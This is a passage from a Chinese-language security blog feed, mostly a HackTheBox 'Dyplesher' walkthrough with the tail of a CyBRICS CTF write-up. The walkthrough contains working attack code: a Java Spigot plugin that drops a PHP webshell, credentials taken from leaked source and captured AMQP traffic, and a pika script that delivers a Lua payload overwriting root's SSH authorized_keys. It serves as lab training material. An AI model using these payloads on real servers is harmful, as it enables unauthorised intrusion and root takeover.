class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"part"</span> <span class="attr">id</span>=<span class="string">"equals"</span> /&gt;</span></span><br><span class="line">*/readfile("/flag")));</span><br></pre></td></tr></table></figure><p>之后来到calc.php传值<code>field=/*&amp;share=1</code>即可在重定向后得到写入shell的地址。<br>远程getflag<br><img src="/2020/07/26/CyBRICS-CTF-2020/4.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>题目比较有意思。体验不错。在这之前的一场3kCTF因为时间原因写不了wp了,题目质量倒是挺好的。下周开始hw就不更文章</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Dyplesher</title>
      <link href="2020/07/24/hackthebox-Dyplesher/"/>
      <url>2020/07/24/hackthebox-Dyplesher/</url>
      
        <content type="html"><![CDATA[<p>  Dyplesher靶机是自己第一次完成的现役insane难度htb靶机。靶机涉及的服务相对比较多,包括web,gogs,minecraft,memcache等等。不过说实话做完后感觉难度跟Travel差不多,到不了insane难度。可能主要是里面的Java知识对于大部分人来说偏繁琐了。总体上感觉还是不错的。这里还是简单记录下过程以及提权部分学到的知识吧。</p><a id="more"></a><p><img src="/2020/07/24/hackthebox-Dyplesher/head.PNG" alt></p><ul><li>靶机ip:10.10.10.190</li><li>kaliip: 10.10.14.23</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>首先是nmap基本扫描得到三个端口22,80,3000.进一步扫描发现还有其他几个端口。4369(epmd),5672(amqp),11211等。</p><p>其中11211是memcache对应端口。之前在travel中用过,所以印象比较深刻。不过这里还是简单从低端口开始审计。</p><p>首先web80端口发现提示这里可能跟mc相关。从cookie的配置可以看出似乎使用了laravel框架。因为是黑盒所以不确定是否能用RCE打。</p><p>接下来首页还提示了我们一个子域名<code>test.dyplesher.htb</code>。加到hosts中。</p><p>页面的<code>/staff</code>有三个用户名</p><p><img src="/2020/07/24/hackthebox-Dyplesher/0.PNG" alt></p><p>这三个用户名在后面会经常出现。</p><p>接下来页面信息收集完了。我们爆破下路径。发现存在<code>/login</code>页面。简单尝试登录未果,看来需要另外收集信息,或者login不是目的。</p><p>3000端口是个gogs服务。提供git的话看来是又有信息泄露了。不过同样我们没有可用的信息。不过gogs倒是在users处提示我们有刚刚上面的三个用户。</p><p>接下来去往test.dyplesher.htb.页面只接受两个参数,似乎是在判断你的两个输入是否一致。然后尝试注入也未果。</p><p>继续扫目录。得到<code>.git</code>泄露。使用githackdump下来。<br>得到index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;h1&gt;Add key <span class="keyword">and</span> value to memcache&lt;h1&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"GET"</span> NAME=<span class="string">"test"</span> ACTION=<span class="string">""</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"add"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"val"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Send"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'add'</span>] != $_GET[<span class="string">'val'</span>])&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> Memcached();</span><br><span class="line">        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, <span class="keyword">true</span>);</span><br><span class="line">        $m-&gt;setSaslAuthData(<span class="string">"felamos"</span>, <span class="string">"zxcvbnm"</span>);</span><br><span class="line">        $m-&gt;addServer(<span class="string">'127.0.0.1'</span>, <span class="number">11211</span>);</span><br><span class="line">        $m-&gt;add($_GET[<span class="string">'add'</span>], $_GET[<span class="string">'val'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Done!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"its equal"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><p>得到一组memcache账户。尝试web页面的登录未果。于是直接连接memcache.此处我们使用nodejs的memcache-cli.npm全局下载即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcache-cli felamos:zxcvbnm@10.10.10.190:11211</span><br></pre></td></tr></table></figure><p>连接上后收集到三个用户名(还是上面三个人)以及三个bcrypt密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br><span class="line">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br><span class="line">$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br></pre></td></tr></table></figure><p>hashcat爆破之.只得到一组felamos密码mommy1。</p><p>继续用这组账户尝试登录。最后在gogs处登录成功。在80端口仍然不能登录,一度让我以为那个登录是假的。</p><p><img src="/2020/07/24/hackthebox-Dyplesher/1.PNG" alt></p><p>审查用户felamos的仓库。只有gitlab跟memcached两个。其中memcached的我们已经收集过了。gitlab仓库发现没有内容,但是有release.</p><p>下载release中的repo.zip(20mb下了快半小时……难受)并解压。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Dyplesher/git/repositories<span class="comment"># find .</span></span><br><span class="line">.</span><br><span class="line">./@hashed</span><br><span class="line">./@hashed/4e</span><br><span class="line">./@hashed/4e/07</span><br><span class="line">./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br><span class="line">./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle</span><br><span class="line">./@hashed/6b</span><br><span class="line">./@hashed/6b/86</span><br><span class="line">./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle</span><br><span class="line">./@hashed/4b</span><br><span class="line">./@hashed/4b/22</span><br><span class="line">./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">./@hashed/d4</span><br><span class="line">./@hashed/d4/73</span><br><span class="line">./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</span><br></pre></td></tr></table></figure><p>这里有<code>.bundle</code>文件。我们单独拿出来并git clone。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(find ../repositories | grep bundle)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        git <span class="built_in">clone</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>bundle clone完后的内容就有点多了。同样简单看下四个仓库的内容,有的是跟mc有关。有的是phpbashshell有关。再次find下找到一个sqlite的db文件users.db。直接进入db.<code>select * from users.</code><br>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|&#x2F;192.168.43.81</span><br></pre></td></tr></table></figure><p>又是一个bcrypt密码。再度hashcat破解得到<code>alexis1</code></p><p>这次我们终于能登录进80端口的页面了。进入后发现是一个控制台。里面显示的是mc信息。然后功能包括上传plugin跟重新加载指定plugin.</p><p>emm虽然没玩过正版mc但是至少知道它是java写的。我在网上找了下发现有非常全面的指南。感觉就算不会java的人也能跟着做了。当然这里我刚好前一天简单学习了下<a href="https://bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/#maven" target="_blank" rel="noopener">maven</a>的使用。所以就idea直接上手maven项目。</p><p>具体参考<a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/" target="_blank" rel="noopener">这篇文章</a>,我就简单做下解释,当做idea学习笔记了。</p><p>首先是pom.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.bycsec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java_mc_exp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">maven.compiler.encoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>10<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>10<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>10<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>spigotmc-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://hub.spigotmc.org/nexus/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.spigotmc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spigot-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.1-R0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>groupID这种建项目前就应该已经让我们自己配置好了。我按照正常标准定为<code>top.bycsec</code>.然后下面properties的设定是一个小坑。因为自己idea的jdk版本跟系统不一致,然后还有系统的语言level水平等等问题。导致maven编译时会出现报错”不支持发行版本5”.经常改完了配置还是报错。解决方法只有像上面那样按照自己的标准配置pom.xml才能避免报错。</p><p>下面的仓库是spigot 给mc用的maven仓库。我们会用到的spigot-api得去对应的仓库下载。</p><p>然后最终完整的目录结构如下。<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.PNG" alt></p><p>resources即外部资源包中需要<code>plugin.yml</code>来指定plugin信息。这里非常重要。因为我们后面要用到plugin的命字。其中似乎不能包含<code>_</code>这样的字符。所以直接取一个正常的名字。</p><p>然后是main下编写。这里我们因为不是用的mvn创建的,是不会指定包的。所以我们自己建个包<code>top.bycsec.plugin</code>并新建<code>PluginExp</code>作为要加载的主类。同时plugin.yml中也将这个类指定为加载的主类。</p><p>接下来是利用类的编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PluginExp</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String code=<span class="string">"&lt;?php @system($_REQUEST[byc]);?&gt;"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">"/var/www/html/bycshell.php"</span>);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                File dir = <span class="keyword">new</span> File(file.getParent());</span><br><span class="line">                dir.mkdirs();</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line">            FileOutputStream outStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            outStream.write(code.getBytes());</span><br><span class="line">            outStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">super</span>.onEnable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDisable();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先注意插件类必须继承JavaPlugin。这个maven下载依赖时会帮我们下好。然后只需重写两个方法即可。我们使用onEnable插入恶意代码,这样就可以在插件生效时直接执行。</p><p>这里选择写入webshell原因有点多。首先题目靶机居然是不通外网的。这个我真没想到。其次java项目大多配置好了一些禁止类。runtime很有可能是行不通的。所以我选择直接写入webshell(猜了一手laravel对应的就是html文件夹而不是dyplesher.htb)</p><p>最后完成后我们使用maven编译打包。直接双击右边maven的生命周期中的package即可创建对应jar file.<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.5.PNG" alt></p><p>回到网页上传plugin并使用plugin名byc404 reload.<br><img src="/2020/07/24/hackthebox-Dyplesher/2.PNG" alt></p><p>写入webshell.</p><p>然后到这一步后才真正意识到靶机不通外网。所以常规弹shell不可行。只能尝试写入ssh公钥。<br><img src="/2020/07/24/hackthebox-Dyplesher/3.PNG" alt></p><p>成功登陆。<br><img src="/2020/07/24/hackthebox-Dyplesher/4.PNG" alt></p><p>小结下。这一部分难度其实还好。主要时间都花在爆破密码以及编写java的exp时被idea的报错给困扰了一小会上了。但是老实说确实没有什么难度。正好让自己把刚学的maven巩固了一下。一举两得。</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>简单看下user文件夹下果不其然还有<code>yuntao</code>跟<code>felamos</code>两个用户</p><p>接下来在使用MinatoTW的id时发现一个重要信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1001(MinatoTW) gid&#x3D;1001(MinatoTW) groups&#x3D;1001(MinatoTW),122(wireshark)</span><br></pre></td></tr></table></figure><p>MinatoTW是wireshark用户组的。也就是说我们可以用靶机上的wireshark抓包。确认了下网卡应该是lo.(lo代表127.0.0.1，即localhost)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -i lo -F pcap -w byc.pcap</span><br></pre></td></tr></table></figure><p>抓一段时间的包后用wireshark打开分析.跟下tcp流</p><p>很快就能抓到关键信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AMQPLib.platformS....PHP.versionS....2.11.1.informationS....    copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.</span><br><span class="line">basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...</span><br><span class="line">EashAnicOc3Op.en_US.</span><br></pre></td></tr></table></figure><p>这一段似乎是AMQP的通信内容。其中有一组用户密码<code>yuntao:EashAnicOc3Op</code></p><p>并且紧接着下面就有多组用户信息。似乎来自于mc<br><img src="/2020/07/24/hackthebox-Dyplesher/5.PNG" alt></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"MinatoTW"</span>,<span class="attr">"email"</span>:<span class="string">"MinatoTW@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"India"</span>,<span class="attr">"password"</span>:<span class="string">"bihys1amFov"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"yuntao"</span>,<span class="attr">"email"</span>:<span class="string">"yuntao@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"Italy"</span>,<span class="attr">"password"</span>:<span class="string">"wagthAw4ob"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"felamos"</span>,<span class="attr">"email"</span>:<span class="string">"felamos@dyplesher.htb"</span>,<span class="attr">"address"</span>:<span class="string">"India"</span>,<span class="attr">"password"</span>:<span class="string">"tieb0graQueg"</span>,<span class="attr">"subscribed"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>经测试发现这三组密码均为系统用户密码。<br>su后即可在felamos文件夹下拿到user.txt</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>接下来在felamos有一个yuntao的文件夹。里面写着send.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.'</span> &gt;  /dev/pts/&#123;&#125;</span><br></pre></td></tr></table></figure><p>cuberite plugins 是以lua语言编写的插件。而这里的信息似乎在提示我们可以编写恶意lua插件来进行privesc.并且提示说只要提供lua的url地址就可以将插件加入服务。</p><p>“Exchange” and “Queue” 的含义在我进行了一些简单的enum后发现应该是AMQP所用到的。由于我们一开始就发现AMQP端口是对外的,而且刚刚wireshark抓到了一组yuntao的账户还没用上。极大可能就是利用amqp去进行通信加载lua插件。</p><p>这里靶机上跑着的是RabbitMQ.而RabbitMQ默认是root权限跑的。并且我们可以在靶机上找到运行信息。</p><p>我们看看一套 MQ 完整流程是什么样的：</p><p>首先将 RabbitMQ 服务启动</p><p>Producer</p><p>1、创建一个 connection<br>2、在 connection 基础上创建一个频道 channel<br>3、在频道 channel 上声明一个 exchange，参数为 exchange 的类型和名称<br>4、在频道 channel 上发布消息，参数为 exchange 的名称以及路由 (routing_key) 以及消息体<br>5、关闭 connection</p><p>这里我们可以推测前面的提示中<code>plugin_data</code>可能就是路由。而我们要传递的消息体就是lua的url.接下来我们使用python 的pika进行编写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">creds=pika.PlainCredentials(<span class="string">'yuntao'</span>,<span class="string">'EashAnicOc3Op'</span>)</span><br><span class="line">params=pika.Connectionparams(<span class="string">'10.10.10.190'</span>,<span class="number">5672</span>,<span class="string">'/'</span>,creds)</span><br><span class="line">conn=pika.BlockingConnection(params)</span><br><span class="line"></span><br><span class="line">channel = conn.channel()</span><br><span class="line">channel.basic_publish(exchange=<span class="string">''</span>, routing_key=<span class="string">'plugin_data'</span>,body=<span class="string">"http://127.0.0.1:9001/exp.lua"</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>然后准备一个恶意的lua脚本。由于lua反弹shell我发现似乎都是不交互的，所以选择写ssh key</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">"/root/.ssh/authorized_keys"</span>, <span class="string">"w"</span>)</span><br><span class="line">f:<span class="built_in">write</span>(<span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1dF791Ph8rC/PU4fXFjW4rBuU8JbmozNWx1kll3NA5r/vhpG05UZ/7dl8+Hs+bbnv/4TMferXgPj27QFJNGBuEfM+ZVO9ah5QNTwrO26vlCP885GyO0RoAoFM0ZNQaYfim1j6zrnplgWtJ7rIHRyrxt6ZDCFq7hGQm8CQP1xbVeaYoYYYHAVVt3IxDbeHh5pJsZDNvzsh1RZNCQlLdwvpoDdWhNPYq+lNYWSjGmW9nMVgQzcY1rk2IEf0Cg5NbZyFtBHITEG0myWIEXtg8D+t9f3IZbgzjaXkN4lVbGAGhNHvfrCemrmTWCbfpuoSS7mE65qfo87yVJdxwWYbx47fe0FMGtDBexa/+WyRApN+E/n3D+Dk56bnzSWiWzzxQptxJVPnM+txWOA6aixGb0PJpO1Wa2S29kg1C4GLNaEKXupursO7Vewq4ZCyzQmeWi2g8BljNqjIA89C9v2cRyFx+lIILxwNn2xbjVVf/WYjcE3lXLpqqz2CzCfuR+4xbSU= root@byc404"</span>)</span><br><span class="line">f:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>在靶机上起个python监听9001,然后kali运行脚本。看到靶机上获取到lua脚本后就可以root ssh登录了。</p><p>rooted.<br><img src="/2020/07/24/hackthebox-Dyplesher/6.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  insane难度的靶机首先确实有一定难度。不过整体上我感觉跟travel难度差不多。主要enum的过程没有那么枯燥,而利用起来的难度也没那么高。但是总归还是很有水平的靶机。需要我们耐心的去整合信息并学习新知识。编写mc跟lua插件都是提醒我们不要任意允许用户上传自定义插件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Intense</title>
      <link href="2020/07/22/hackthebox-Intense/"/>
      <url>2020/07/22/hackthebox-Intense/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" 